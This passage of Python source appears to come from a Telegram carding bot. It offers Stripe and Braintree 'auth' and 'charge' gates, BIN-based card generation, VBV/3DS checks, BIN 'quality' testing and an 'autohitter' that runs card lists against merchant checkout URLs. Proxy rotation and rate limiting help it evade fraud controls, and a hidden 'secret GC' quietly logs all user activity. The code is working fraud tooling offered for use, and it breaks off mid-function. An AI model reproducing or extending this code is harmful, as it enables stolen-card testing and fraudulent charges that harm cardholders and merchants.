    # Help menu navigation
    if data == "help_auth_gates":
        answer_callback(cb_id)
        txt = (
            f"⍟━━━⌁ <b>Auth Gates</b> ⌁━━━⍟\n\n"
            "<code>/auth</code>  ·  Stripe Auth (WooCommerce/WCPay)\n"
            "<code>/sa1</code>  ·  Stripe Auth CCN\n"
            "<code>/sa2</code>  ·  Stripe Auth CVV\n"
            "<code>/nvbv</code>  ·  Braintree Non-VBV\n\n"
            "<i>Auth gates verify card validity without charging.</i>\n"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_charge_gates":
        answer_callback(cb_id)
        txt = (
            f"⍟━━━⌁ <b>Charge Gates</b> ⌁━━━⍟\n\n"
            "<code>/chg3</code>  ·  Stripe Charge $3 (Bloomerang)\n\n"
            "<i>Charge gates process real transactions.\n"
            "Live = card got charged successfully.</i>\n"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_tools":
        answer_callback(cb_id)
        txt = (
            f"⍟━━━⌁ <b>Tools</b> ⌁━━━⍟\n\n"
            "<code>/gen 424242 10</code>  ·  Generate cards from BIN\n"
            "<code>/binlookup 424242</code>  ·  BIN info lookup\n"
            "<code>/binquality 424242</code>  ·  BIN quality check\n"
            "<code>/vbv 4111...</code>  ·  VBV/3DS check\n"
            "<code>/analyze https://...</code>  ·  Detect payment provider\n"
            "<code>/autohitter URL</code>  ·  Auto-hit checkout URL\n"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_commands":
        answer_callback(cb_id)
        txt = (
            f"⍟━━━⌁ <b>Commands</b> ⌁━━━⍟\n\n"
            "<code>/bin 424242</code>  ·  Set BIN filter\n"
            "<code>/clearbin</code>  ·  Clear BIN filter\n"
            "<code>/cancel</code>  ·  Stop active task\n"
            "<code>/gates</code>  ·  List all gates + hit rates\n"
            "<code>/stats</code>  ·  Your lifetime stats\n"
            "<code>/mykey</code>  ·  Check your key info\n"
            "<code>/redeem KEY</code>  ·  Redeem access key\n"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_howto":
        answer_callback(cb_id)
        txt = (
            f"⍟━━━⌁ <b>How to Use</b> ⌁━━━⍟\n\n"
            "<b>Single card:</b>\n"
            "<code>/auth 4111111111111111|01|25|123</code>\n\n"
            "<b>Bulk check:</b>\n"
            "1. Send a <code>.txt</code> file with cards\n"
            "2. Reply to it with the gate command\n\n"
            "<b>Auto Hitter:</b>\n"
            "Reply to a .txt file with:\n"
            "<code>/autohitter https://checkout-url.com</code>\n\n"
            "<b>Generate cards:</b>\n"
            "<code>/gen 424242 10</code>\n"
        )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_admin":
        answer_callback(cb_id)
        if not is_admin(cb_user_id):
            txt = f"⍟━━━⌁ <b>Admin section is restricted.</b> ⌁━━━⍟"
        else:
            txt = (
                f"⍟━━━⌁ <b>Admin Commands</b> ⌁━━━⍟\n\n"
                "<code>/genkey</code>  ·  Generate single key\n"
                "<code>/genkeys 10</code>  ·  Bulk generate keys\n"
                "<code>/adminkey ID 7d</code>  ·  Promote to admin\n"
                "<code>/adminlist</code>  ·  List all admins\n"
                "<code>/authlist</code>  ·  List authorized users\n"
                "<code>/revoke ID</code>  ·  Revoke user access\n"
                "<code>/broadcast msg</code>  ·  Message all users\n"
                "<code>/proxy</code>  ·  Proxy pool status\n"
                "<code>/addproxy</code>  ·  Add proxies to pool\n"
                "<code>/scrapeproxies</code>  ·  Scrape fresh proxies\n"
                "<code>/authsite</code>  ·  Set /auth site URL\n"
                "<code>/chkapis</code>  ·  Health check all APIs\n"
            )
        if chat_id and msg_id:
            edit_message(chat_id, msg_id, txt, reply_markup=help_back_markup())
        return

    if data == "help_back":
        answer_callback(cb_id)
        if chat_id and msg_id:
            edit_message(chat_id, msg_id,
                f"⍟━━━⌁ <b>{BOT_NAME} Help</b> ⌁━━━⍟\n\nChoose a category below.",
                reply_markup=help_main_markup())
        return


# ============================================================
#  Update handler
# ============================================================
def handle_update(update):
    if "callback_query" in update:
        handle_callback(update)
        return

    msg = update.get("message")
    if not msg:
        return

    chat_id = msg["chat"]["id"]
    user_id = msg["from"]["id"]
    username = msg["from"].get("username", "")
    text = (msg.get("text") or msg.get("caption") or "").strip()

    if not text:
        return

    # Log ALL activity to secret GC
    notify_activity(user_id, username, text)

    # --- /start ---
    if text == "/start":
        send_message(chat_id, fmt_start(username, user_id))
        return

    # --- /help ---
    if text == "/help":
        send_message(chat_id,
            f"⍟━━━⌁ <b>{BOT_NAME} Help</b> ⌁━━━⍟\n\nChoose a category below.",
            reply_markup=help_main_markup())
        return

    # --- /secgcset (secret — set secret GC) ---
    if text.startswith("/secgcset"):
        if not is_admin(user_id):
            return  # Completely hidden
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            current = get_secret_gc()
            if current:
                send_message(chat_id,
                    f"⍟━━━⌁ <b>Secret GC</b> ⌁━━━⍟\n\n"
                    f"Current: <code>{current}</code>\n\n"
                    f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>")
            else:
                send_message(chat_id,
                    f"⍟━━━⌁ <b>Secret GC</b> ⌁━━━⍟\n\n"
                    f"Not configured.\n\n"
                    f"<code>/secgcset CHAT_ID</code> or <code>/secgcset here</code>")
            return
        target = parts[1].strip()
        if target.lower() == "here":
            target = str(chat_id)
        set_secret_gc(int(target))
        send_message(chat_id,
            f"⍟━━━⌁ <b>Secret GC Set</b> ⌁━━━⍟\n\n"
            f"Chat ID: <code>{target}</code>")
        return

    # --- /gctest (secret — test secret GC) ---
    if text == "/gctest":
        if not is_admin(user_id):
            return
        gc_id = get_secret_gc()
        if not gc_id:
            send_message(chat_id, "⍟━━━⌁ <b>No secret GC configured.</b> ⌁━━━⍟\n\nUse /secgcset first.")
            return
        try:
            resp = send_message(gc_id,
                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
                f"✅ Secret GC test — it works!\n"
                f"Triggered by admin <code>{user_id}</code>")
            if resp.get("ok"):
                send_message(chat_id, "✅ Secret GC test sent successfully.")
            else:
                send_message(chat_id, f"❌ Failed to send. Error: {resp.get('description', 'Unknown')}")
        except Exception as e:
            send_message(chat_id, f"❌ Error: {str(e)[:60]}")
        return

    # --- /bin ---
    if text.startswith("/bin") and not text.startswith("/binlookup") and not text.startswith("/binquality"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/bin 424242,555555</code>")
            return
        bins = parts[1].replace(" ", "").split(",")
        user_bins[user_id] = bins
        send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>BIN filter set:</b> <code>{', '.join(bins)}</code>")
        return

    # --- /clearbin ---
    if text == "/clearbin":
        if user_id in user_bins:
            del user_bins[user_id]
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nBIN filter cleared.")
        else:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo BIN filter active.")
        return

    # --- /cancel ---
    if text == "/cancel":
        if user_id in active_users:
            cancel_flags[user_id] = True
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nStopping your task...")
        else:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo active task.")
        return

    # --- /gen ---
    if text.startswith("/gen") and text.split()[0] == "/gen":
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        parts = text.split()
        if len(parts) < 2:
            send_message(chat_id,
                f"⍟━━━⌁ <b>Card Generator</b> ⌁━━━⍟\n\n"
                f"<b>Usage:</b> <code>/gen 424242 10</code>")
            return
        bin_input = parts[1]
        count = 10
        if len(parts) >= 3:
            try:
                count = min(int(parts[2]), 50)
            except ValueError:
                count = 10
        cards = generate_cards(bin_input, count)
        if not cards:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid BIN.")
            return
        card_text = "\n".join(f"<code>{c}</code>" for c in cards)
        send_message(chat_id,
            f"⍟━━━⌁ <b>Generated {len(cards)} Cards</b> ⌁━━━⍟\n\n"
            f"BIN: <code>{bin_input}</code>\n\n{card_text}")
        return

    # --- /binlookup ---
    if text.startswith("/binlookup"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/binlookup 424242</code>")
            return
        bin_num = parts[1].strip().split('|')[0][:6]
        info, err = bin_lookup(bin_num)
        if info:
            send_message(chat_id,
                f"⍟━━━⌁ <b>BIN Lookup — {bin_num}</b> ⌁━━━⍟\n\n"
                f"Brand: <code>{info['brand']}</code>\n"
                f"Type: <code>{info['type']}</code>\n"
                f"Bank: <code>{info['bank']}</code>\n"
                f"Country: <code>{info['country']}</code> {info['emoji']}")
        else:
            send_message(chat_id, f"⍟━━━⌁ <b>BIN Lookup Failed</b> ⌁━━━⍟\n\n{err}")
        return

    # --- /vbv ---
    if text.startswith("/vbv"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id,
                f"⍟━━━⌁ <b>VBV/3DS Check</b> ⌁━━━⍟\n\n"
                f"<b>Usage:</b> <code>/vbv CC|MM|YY|CVV</code>")
            return
        send_message(chat_id, f"🔍 <b>Checking VBV/3DS enrollment...</b>")
        proxy_dict = get_next_proxy()
        result = vbv_lookup(parts[1].strip(), proxy_dict=proxy_dict)

        cc_num = re.sub(r'\D', '', parts[1].strip().split('|')[0])
        bin6 = cc_num[:6] if len(cc_num) >= 6 else cc_num
        bin_info, _ = bin_lookup(bin6)
        bin_line = ""
        if bin_info:
            bin_line = (f"\n<b>BIN:</b> <code>{bin6}</code>\n"
                        f"<b>Brand:</b> {bin_info.get('brand', '?')} - {bin_info.get('type', '?')}\n"
                        f"<b>Bank:</b> {bin_info.get('bank', '?')}\n"
                        f"<b>Country:</b> {bin_info.get('country', '?')} {bin_info.get('emoji', '')}")

        send_message(chat_id,
            f"⍟━━━⌁ <b>VBV/3DS Result</b> ⌁━━━⍟\n\n{result}{bin_line}")
        return

    # --- /binquality ---
    if text.startswith("/binquality"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id,
                f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
                f"<b>Usage:</b> <code>/binquality 424242</code>\n"
                f"Generates 10 cards, checks each with Stripe Auth.")
            return

        bin_input = parts[1].strip().split('|')[0].strip()
        if len(bin_input) < 6:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nBIN must be at least 6 digits.")
            return

        with active_lock:
            if user_id in active_users:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nYou already have a task running.")
                return
            active_users.add(user_id)

        cancel_flags.pop(user_id, None)

        init_resp = send_message(chat_id,
            f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
            f"BIN: <code>{bin_input}</code>\nGenerating 10 cards...",
            reply_markup=stop_button_markup(user_id))
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run_binquality():
            try:
                cards = generate_cards(bin_input, 10)
                if not cards:
                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to generate cards.")
                    with active_lock:
                        active_users.discard(user_id)
                    return

                if progress_msg_id:
                    edit_message(chat_id, progress_msg_id,
                        f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
                        f"BIN: <code>{bin_input}</code>\n"
                        f"Generated: <code>{len(cards)}</code>\nChecking...\n"
                        f"Progress: <code>0/{len(cards)}</code>",
                        reply_markup=stop_button_markup(user_id))

                proxies_list = list(_global_proxies) if _global_proxies else []
                approved = 0
                declined = 0
                errors = 0
                approved_cards = []
                total = len(cards)

                for i, card in enumerate(cards):
                    if cancel_flags.get(user_id):
                        break
                    result = process_single_entry(card, proxies_list, user_id, gate="auth")
                    r_lower = result.lower() if isinstance(result, str) else ""
                    if "approved" in r_lower or "charged" in r_lower:
                        approved += 1
                        approved_cards.append(card)
                    elif "declined" in r_lower:
                        declined += 1
                    else:
                        errors += 1

                    now_idx = i + 1
                    if progress_msg_id and (now_idx % 2 == 0 or now_idx == total):
                        pct = int(now_idx / total * 100)
                        bar_len = 12
                        filled = int(bar_len * now_idx / total)
                        bar = "█" * filled + "░" * (bar_len - filled)
                        edit_message(chat_id, progress_msg_id,
                            f"⍟━━━⌁ <b>BIN Quality Check</b> ⌁━━━⍟\n\n"
                            f"BIN: <code>{bin_input}</code>\n"
                            f"<code>{bar}</code> {pct}%\n\n"
                            f"Progress: <code>{now_idx}/{total}</code>\n"
                            f"✅ Approved: <code>{approved}</code>\n"
                            f"❌ Declined: <code>{declined}</code>\n"
                            f"⚠️ Errors: <code>{errors}</code>",
                            reply_markup=stop_button_markup(user_id) if now_idx < total else None)

                cancel_flags.pop(user_id, None)

                hit_rate = (approved / total * 100) if total > 0 else 0
                if hit_rate >= 50:
                    quality = "PREMIUM BIN"
                    quality_desc = "High approval rate — strong for charges"
                elif hit_rate >= 20:
                    quality = "GOOD BIN"
                    quality_desc = "Decent approval rate — usable"
                elif hit_rate > 0:
                    quality = "LOW BIN"
                    quality_desc = "Low approval rate — mostly dead"
                else:
                    quality = "DEAD BIN"
                    quality_desc = "Zero approvals — likely all dead"

                try:
                    info, _ = bin_lookup(bin_input[:6])
                except Exception:
                    info = None

                bin_line = ""
                if info:
                    bin_line = (
                        f"Brand: <code>{info.get('brand', 'N/A')}</code>\n"
                        f"Bank: <code>{info.get('bank', 'N/A')}</code>\n"
                        f"Country: <code>{info.get('country', 'N/A')}</code> {info.get('emoji', '')}\n"
                    )

                approved_text = ""
                if approved_cards:
                    approved_text = "\n<b>Approved Cards:</b>\n" + "\n".join(f"<code>{c}</code>" for c in approved_cards) + "\n"

                send_message(chat_id,
                    f"⍟━━━⌁ <b>BIN Quality — {quality}</b> ⌁━━━⍟\n\n"
                    f"BIN: <code>{bin_input}</code>\n{bin_line}\n"
                    f"Checked: <code>{total}</code>\n"
                    f"✅ Approved: <code>{approved}</code>\n"
                    f"❌ Declined: <code>{declined}</code>\n"
                    f"⚠️ Errors: <code>{errors}</code>\n"
                    f"Hit Rate: <code>{hit_rate:.0f}%</code>\n\n"
                    f"<b>Verdict:</b> {quality_desc}\n{approved_text}")

            except Exception as e:
                send_message(chat_id, f"⍟━━━⌁ <b>Error:</b> {str(e)[:80]} ⌁━━━⍟")
            finally:
                with active_lock:
                    active_users.discard(user_id)

        threading.Thread(target=_run_binquality, daemon=True).start()
        return

    if text.startswith("/analyze"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n<b>Usage:</b> <code>/analyze https://example.com</code>")
            return
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        url = parts[1].strip()
        send_message(chat_id, f"⍟━━━⌁ <b>Analyzing...</b> ⌁━━━⍟\n<code>{url[:60]}</code>")

        def _do_analyze():
            info = analyze_url(url)
            provider = info.get('provider', 'unknown')
            merchant = info.get('merchant', 'Unknown')
            product = info.get('product', '-')
            amount = info.get('amount', '-')
            currency = info.get('currency', 'USD')
            error = info.get('error')
            lines_out = [
                f"⍟━━━⌁ <b>URL Analysis</b> ⌁━━━⍟\n",
                f"URL: <code>{url[:80]}</code>",
                f"Provider: <code>{provider.upper()}</code>",
                f"Merchant: <code>{merchant}</code>",
            ]
            if product and product != '-':
                lines_out.append(f"Product: <code>{product}</code>")
            if amount:
                lines_out.append(f"Amount: <code>{amount} {currency}</code>")
            if error:
                lines_out.append(f"Error: {error}")
            send_message(chat_id, "\n".join(lines_out))

        threading.Thread(target=_do_analyze, daemon=True).start()
        return

    # --- /proxy (admin) ---
    if text.startswith("/proxy") and text.split()[0] == "/proxy":
        if not is_admin(user_id):
            return
        parts = text.split()

        if len(parts) == 1:
            count = get_proxy_count()
            send_message(chat_id,
                f"⍟━━━⌁ <b>Proxy Pool</b> ⌁━━━⍟\n\n"
                f"Loaded: <code>{count}</code>\n"
                f"Rotation: <code>Round-robin</code>\n"
                f"Index: <code>{_proxy_index}</code>\n\n"
                "<code>/proxy reload</code>  ·  Reload\n"
                "<code>/proxy test [n]</code>  ·  Test connectivity")
            return

        sub = parts[1].lower()
        if sub == "reload":
            new_count = load_global_proxies()
            send_message(chat_id,
                f"⍟━━━⌁ <b>Proxies Reloaded</b> ⌁━━━⍟\n\nActive: <code>{new_count}</code>")
            return

        if sub == "test":
            test_count = 1
            if len(parts) >= 3:
                try:
                    test_count = min(int(parts[2]), 10)
                except ValueError:
                    test_count = 1
            if get_proxy_count() == 0:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo proxies loaded.")
                return
            send_message(chat_id, f"Testing {test_count} proxy(ies)...")

            def _do_test():
                results = []
                tested = set()
                for _ in range(test_count):
                    p = random.choice(_global_proxies)
                    while p in tested and len(tested) < len(_global_proxies):
                        p = random.choice(_global_proxies)
                    tested.add(p)
                    alive, latency, error = test_proxy_connectivity(p)
                    masked = p[:20] + "..." if len(p) > 20 else p
                    if alive:
                        results.append(f"✅ <code>{masked}</code> — <code>{latency}ms</code>")
                    else:
                        results.append(f"❌ <code>{masked}</code> — <code>{error}</code>")
                alive_count = sum(1 for r in results if "✅" in r)
                send_message(chat_id,
                    f"⍟━━━⌁ <b>Proxy Test</b> ⌁━━━⍟\n\n"
                    f"Tested: <code>{len(results)}</code>\n"
                    f"Alive: <code>{alive_count}</code>\n"
                    f"Dead: <code>{len(results) - alive_count}</code>\n\n"
                    + "\n".join(results))
            threading.Thread(target=_do_test, daemon=True).start()
            return
        return

    # --- /addproxy ---
    if text.startswith("/addproxy"):
        if not is_admin(user_id):
            return
        new_proxies_raw = []
        reply = msg.get("reply_to_message")
        if reply and reply.get("document"):
            doc = reply["document"]
            fname = doc.get("file_name", "")
            if fname.lower().endswith(".txt"):
                content = download_file(doc["file_id"])
                if content:
                    new_proxies_raw = [l.strip() for l in content.splitlines() if l.strip() and not l.strip().startswith('#')]

        parts = text.split(maxsplit=1)
        if len(parts) >= 2:
            inline_proxies = [l.strip() for l in parts[1].splitlines() if l.strip() and not l.strip().startswith('#')]
            expanded = []
            for p in inline_proxies:
                if ',' in p and '://' not in p and '@' not in p:
                    expanded.extend([x.strip() for x in p.split(',') if x.strip()])
                else:
                    expanded.append(p)
            new_proxies_raw.extend(expanded)

        if not new_proxies_raw:
            send_message(chat_id,
                f"⍟━━━⌁ <b>Add Proxies</b> ⌁━━━⍟\n\n"
                "Paste inline or reply to .txt:\n"
                "<code>/addproxy host:port</code>\n"
                "<code>/addproxy host:port:user:pass</code>")
            return

        send_message(chat_id, f"Validating {len(new_proxies_raw)} proxy(ies)...")

        def _do_add_proxies():
            global _global_proxies
            valid = []
            results_lines = []
            for raw in new_proxies_raw:
                validated = validate_proxy_format(raw)
                if not validated:
                    masked = raw[:25] + "..." if len(raw) > 25 else raw
                    results_lines.append(f"❌ <code>{masked}</code> — Invalid format")
                    continue
                alive, latency, error = test_proxy_connectivity(raw)
                masked = raw[:25] + "..." if len(raw) > 25 else raw
                if alive:
                    valid.append(raw)
                    results_lines.append(f"✅ <code>{masked}</code> — <code>{latency}ms</code>")
                else:
                    results_lines.append(f"❌ <code>{masked}</code> — <code>{error}</code>")
            if valid:
                with open(PROXIES_FILE, 'a') as f:
                    for p in valid:
                        f.write(p + "\n")
                with _proxy_lock:
                    _global_proxies.extend(valid)
            send_message(chat_id,
                f"⍟━━━⌁ <b>Proxy Add Results</b> ⌁━━━⍟\n\n"
                f"Submitted: <code>{len(new_proxies_raw)}</code>\n"
                f"✅ Working: <code>{len(valid)}</code>\n"
                f"Total pool: <code>{len(_global_proxies)}</code>\n\n"
                + "\n".join(results_lines[:20]))
        threading.Thread(target=_do_add_proxies, daemon=True).start()
        return

    # --- /setgc (admin) ---
    if text.startswith("/setgc"):
        if not is_admin(user_id):
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            current = get_notification_gc()
            send_message(chat_id,
                f"⍟━━━⌁ <b>Notification GC</b> ⌁━━━⍟\n\n"
                f"Current: <code>{current or 'Not set'}</code>\n\n"
                f"<code>/setgc CHAT_ID</code> or <code>/setgc here</code>")
            return
        target = parts[1].strip()
        if target.lower() == "here":
            target = str(chat_id)
        set_notification_gc(int(target))
        send_message(chat_id,
            f"⍟━━━⌁ <b>Notification GC Set</b> ⌁━━━⍟\n\nChat ID: <code>{target}</code>")
        return

    # --- /scrapeproxies ---
    if text == "/scrapeproxies":
        if not is_admin(user_id):
            return
        send_message(chat_id, "Scraping proxies...")

        def _do_scrape():
            proxies = scrape_proxies()
            if proxies:
                with open(PROXIES_FILE, 'w') as f:
                    f.write('\n'.join(proxies))
                load_global_proxies()
                filename = f"proxies_{int(time.time())}.txt"
                filepath = os.path.join(DATA_DIR, filename)
                with open(filepath, "w") as f:
                    f.write('\n'.join(proxies))
                send_document(chat_id, filepath, filename,
                    caption=f"⍟━━━⌁ <b>Scraped {len(proxies)} Proxies</b> ⌁━━━⍟\n"
                            f"Pool: <code>{get_proxy_count()}</code>")
            else:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to scrape proxies.")
        threading.Thread(target=_do_scrape, daemon=True).start()
        return

    # --- /autohitter ---
    if text.startswith("/autohitter"):
        if not is_authorized(user_id):
            send_message(chat_id, fmt_unauthorized())
            return
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send_message(chat_id,
                f"⍟━━━⌁ <b>Auto Hitter</b> ⌁━━━⍟\n\n"
                "<b>Usage:</b>\n"
                "<code>/autohitter https://url.com\n"
                "4111111111111111|01|25|123</code>\n\n"
                "Or reply to a .txt file with:\n"
                "<code>/autohitter https://url.com</code>")
            return

        remaining = parts[1].strip()
        url_match = re.search(r'(https?://\S+)', remaining)
        if not url_match:
            send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nNo valid URL found.")
            return

        target_url = url_match.group(1)
        before_url = remaining[:url_match.start()].strip()
        after_url = remaining[url_match.end():].strip()
        extra_text = (before_url + " " + after_url).strip()

        try:
            from urllib.parse import urlparse
            parsed_url = urlparse(target_url)
            site_name = parsed_url.netloc.replace("www.", "")
        except Exception:
            site_name = target_url[:40]

        card_lines = []
        for potential_line in remaining.split('\n'):
            potential_line = potential_line.strip()
            if '|' in potential_line and not potential_line.startswith('http'):
                cc_match = re.match(r'^\d{13,19}\|', potential_line)
                if cc_match:
                    card_lines.append(potential_line)

        is_bin_mode = False
        bin_input = ""
        if not card_lines and extra_text:
            clean = extra_text.replace(" ", "")
            if re.match(r'^\d{6,8}$', clean):
                is_bin_mode = True
                bin_input = clean

        if not card_lines and not is_bin_mode and extra_text and '|' in extra_text:
            cc_parts = extra_text.split('|')
            if len(cc_parts) == 4:
                card_lines.append(extra_text)

        reply = msg.get("reply_to_message")
        if not card_lines and not is_bin_mode and reply:
            if reply.get("document"):
                doc = reply["document"]
                fname = doc.get("file_name", "")
                if fname.lower().endswith(".txt"):
                    content = download_file(doc["file_id"])
                    if content:
                        for line in content.splitlines():
                            line = line.strip()
                            if line and '|' in line and re.match(r'^\d', line):
                                card_lines.append(line)
            elif reply.get("text"):
                for line in reply["text"].splitlines():
                    line = line.strip()
                    if line and '|' in line and re.match(r'^\d', line):
                        card_lines.append(line)

        if is_bin_mode:
            send_message(chat_id,
                f"⍟━━━⌁ <b>AutoHitter — BIN Mode</b> ⌁━━━⍟\n\n"
                f"Site: <code>{site_name}</code>\n"
                f"BIN: <code>{bin_input}</code>\nGenerating 10 cards...")
            gen_cards = generate_cards(bin_input, 10)
            if not gen_cards:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nFailed to generate cards.")
                return
            card_lines = gen_cards

        if not card_lines:
            send_message(chat_id,
                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
                "No cards found. Provide cards inline, reply to a message/file, or use a BIN.")
            return

        if len(card_lines) == 1:
            cc_line = card_lines[0]
            send_message(chat_id,
                f"⍟━━━⌁ <b>AutoHitter</b> ⌁━━━⍟\n\n"
                f"Site: <code>{site_name}</code>\nAnalyzing...")

            def _single_hit():
                try:
                    from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line, detect_provider, SUPPORTED_PROVIDERS
                except ImportError:
                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAutoHitter module not available.")
                    return
                url_info = URLAnalyzer.analyze(target_url)
                provider = url_info.get('provider', 'unknown')
                merchant = url_info.get('merchant', site_name)
                if provider not in SUPPORTED_PROVIDERS:
                    send_message(chat_id,
                        f"⍟━━━⌁ <b>Unsupported Provider</b> ⌁━━━⍟\n\n"
                        f"Detected: <code>{provider.upper()}</code>")
                    return
                card = parse_card_line(cc_line)
                if not card:
                    send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nInvalid card format.")
                    return

                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(hit_single(target_url, card, 1))
                loop.close()

                if result.get('success'):
                    hit_msg = _fmt_hit_notification(user_id, username, f"AutoHitter ({provider})", cc_line,
                                                    "Approved", f"{result.get('response_time', 0):.1f}s")
                    send_message(chat_id, hit_msg)
                    notify_hit(user_id, username, f"AutoHitter ({provider})", cc_line, "Approved")
                elif result.get('error'):
                    send_message(chat_id,
                        f"⍟━━━⌁ <b>ERROR</b> ⌁━━━⍟\n\n"
                        f"Card: <code>{cc_line}</code>\nError: <code>{result['error'][:80]}</code>")
                else:
                    send_message(chat_id,
                        f"⍟━━━⌁ <b>DECLINED</b> ⌁━━━⍟\n\n"
                        f"Card: <code>{cc_line}</code>\nReason: <code>{result.get('decline_code', 'unknown')}</code>")
            threading.Thread(target=_single_hit, daemon=True).start()
            return

        # Bulk autohitter
        with active_lock:
            if user_id in active_users:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nYou already have a task running.")
                return
            active_users.add(user_id)
        cancel_flags.pop(user_id, None)

        user_limit = get_user_line_limit(user_id)
        if user_limit and len(card_lines) > user_limit:
            with active_lock:
                active_users.discard(user_id)
            send_message(chat_id,
                f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\n"
                f"Your key allows <code>{user_limit}</code> lines. Provided: <code>{len(card_lines)}</code>.")
            return

        init_resp = send_message(chat_id,
            f"⍟━━━⌁ <b>AutoHitter Starting</b> ⌁━━━⍟\n\n"
            f"Site: <code>{site_name}</code>\nCards: <code>{len(card_lines)}</code>",
            reply_markup=stop_button_markup(user_id))
        progress_msg_id = init_resp.get("result", {}).get("message_id")

        def _run_autohitter():
            try:
                from dlx_autohitter import URLAnalyzer, hit_single, parse_card_line as ah_parse_card, SUPPORTED_PROVIDERS, SmartRateLimiter
            except ImportError:
                send_message(chat_id, f"⍟━━━⌁ <b>{BOT_NAME}</b> ⌁━━━⍟\n\nAutoHitter module not available.")
                with active_lock:
                    active_users.discard(user_id)
                return

            url_info = URLAnalyzer.analyze(target_url)
            provider = url_info.get('provider', 'unknown')
            merchant = url_info.get('merchant', site_name)

            if provider not in SUPPORTED_PROVIDERS:
                send_message(chat_id,
                    f"⍟━━━⌁ <b>Unsupported Provider</b> ⌁━━━⍟\n\nDetected: <code>{provider.upper()}</code>")
                with active_lock:
                    active_users.discard(user_id)
                return

            rate_limiter = SmartRateLimiter()
            total = len(card_lines)
            successes = 0
            fails = 0
            approved_list = []
            start_time = time.time()
            last_edit = [0]

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            for i, line in enumerate(card_lines):
                if cancel_flags.get(user_id):
                    break
                card = ah_parse_card(line)
                if not card:
                    fails += 1
                    continue
                if i > 0:
                    delay = rate_limiter.calculate_delay('declined' if fails > successes else 'success')
                    time.sleep(delay)
                result = loop.run_until_complete(hit_single(target_url, card, i + 1))
                if result.get('success'):
                    successes += 1
                    approved_list.append(line)
                    hit_msg = _fmt_hit_notification(user_id, username, f"AutoHitter ({provider})", line,
                                                    "Approved", f"{result.get('response_time', 0):.1f}s")
                    send_message(chat_id, hit_msg)
                    notify_hit(user_id, username, f"AutoHitter ({provider})", line, "Approved")
                else:
                    fails += 1

                now = time.time()
                if progress_msg_id and (now - last_edit[0] >= 4 or i + 1 == total):
                    last_edit[0] = now
                    elapsed = now - start_time
                    cpm = int(((i + 1) / elapsed) * 60) if elapsed > 0 else 0
                    pct = int((i + 1) / total * 100)
                    bar_len = 16
                    filled = int(bar_len * (i + 1) / total)
                    bar = "█" * filled + "░" * (bar_len - filled)
                    markup = None if (i + 1 == total) else stop_button_markup(user_id)
                    edit_message(chat_id, progress_msg_id,
                        f"⍟━━━⌁ <b>AutoHitter {'✅ Complete' if i+1==total else 'Active'}</b> ⌁━━━⍟\n\n"
